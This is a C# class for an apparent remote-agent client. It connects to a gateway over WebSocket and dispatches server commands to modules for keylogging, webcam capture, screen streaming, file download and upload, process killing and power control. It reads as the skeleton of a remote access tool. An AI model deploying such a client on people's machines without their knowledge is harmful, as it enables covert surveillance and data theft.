using System;
using System.Collections.Generic;
using System.Text.Json;
using AgentSystem.Managers;
using AgentSystem.Modules;

namespace AgentSystem.Core
{
    public class AgentClient
    {
        public string AgentId { get; private set; }
        private string gatewayUrl;
        private WebSocketClient wsClient;
        public MessageDispatcher Dispatcher { get; private set; }

        public SecurityManager SecurityManager { get; private set; }
        public UIManager UIManager { get; private set; }

        private Dictionary<string, BaseModule> modules;
        private PowerModule powerModule;

        public AgentClient(string agentId, string gatewayUrl)
        {
            // SỬA: Gán giá trị vào property AgentId viết hoa
            AgentId = agentId; 
            this.gatewayUrl = gatewayUrl;

            SecurityManager = new SecurityManager();
            UIManager = new UIManager();
            Dispatcher = new MessageDispatcher(this);
            wsClient = new WebSocketClient(this, gatewayUrl);

            InitializeModules();
        }

        private void InitializeModules()
        {
            powerModule = new PowerModule(this);
            modules = new Dictionary<string, BaseModule>
            {
                { "app_start", new AppModule(this) },
                { "app_stop", new AppModule(this) },
                { "app_list", new AppModule(this) },

                { "proc_list", new ProcessModule(this) },
                { "proc_kill", new ProcessModule(this) },

                { "keylog_start", new KeyloggerModule(this) },
                { "keylog_stop", new KeyloggerModule(this) },

                { "webcam_start", new WebcamModule(this) },
                { "webcam_stop", new WebcamModule(this) },

                { "fs_list", new FileModule(this) },
                { "fs_get", new FileModule(this) },
                { "fs_put", new FileModule(this) },

                { "screenshot", new StreamModule(this) },
                { "screen_stream", new StreamModule(this) },
                { "screen_stream_stop", new StreamModule(this) },
            };
        }

        public void Start()
        {
            wsClient.Connect();
            // SỬA: Dùng thuộc tính AgentId để đăng ký
            SendResponse(new { type = "REGISTER", agent_id = AgentId });
        }

        public void Stop()
        {
            wsClient.Disconnect();
        }

        public void SendResponse(object responseData)
        {
            string json = JsonSerializer.Serialize(responseData);
            wsClient.SendText(json);
        }

        public void SendBinaryFrame(byte[] bytes)
        {
            wsClient.SendBinary(bytes);
        }

        public void RouteCommand(Models.CommandPacket packet)
        {
            if (packet.Type == "policy_update")
            {
                // Giải mã dữ liệu Whitelist từ Server gửi xuống
                var whitelist = JsonSerializer.Deserialize<List<string>>(packet.Params.GetProperty("app_whitelist").GetRawText());
                var sandbox = packet.Params.GetProperty("sandbox_path").GetString();

                // Nạp trực tiếp vào RAM của SecurityManager
                SecurityManager.UpdatePolicy(whitelist, sandbox);
                return;
            }
            if (packet.Module != null && modules.TryGetValue(packet.Module, out BaseModule module))
            {
                System.Threading.Tasks.Task.Run(() =>
                {
                    try
                    {
                        module.Execute(packet.Action ?? packet.Module, packet.Params, packet.CommandId);
                    }
                    catch (Exception ex)
                    {
                        // SỬA: Bổ sung trường agent_id vào gói tin ERROR
                        SendResponse(new { type = "ERROR", agent_id = AgentId, command_id = packet.CommandId, message = ex.Message });
                    }
                });
            }
            else if (packet.Type == "power")
            {
                System.Threading.Tasks.Task.Run(() =>
                {
                    try
                    {
                        powerModule.Execute(packet.Action, packet.Params, packet.CommandId);
                    }
                    catch (Exception ex)
                    {
                        // SỬA: Bổ sung trường agent_id vào gói tin ERROR
                        SendResponse(new { type = "ERROR", agent_id = AgentId, command_id = packet.CommandId, message = ex.Message });
                    }
                });
            }
        }
    }
}